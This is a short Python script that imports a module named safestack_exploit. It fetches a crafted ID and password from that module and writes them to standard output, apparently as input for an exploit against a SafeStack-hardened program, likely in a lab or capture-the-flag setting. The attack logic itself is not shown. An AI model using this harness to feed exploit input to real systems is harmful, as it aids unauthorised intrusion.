import sys
import safestack_exploit

if __name__ == "__main__":
    try:
        byte_data = safestack_exploit.get_id(0, 0)
        byte_data += b"\n"
        byte_data += safestack_exploit.get_password(0, 0)
        byte_data += b"\n"
        sys.stdout.buffer.write(byte_data)
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)
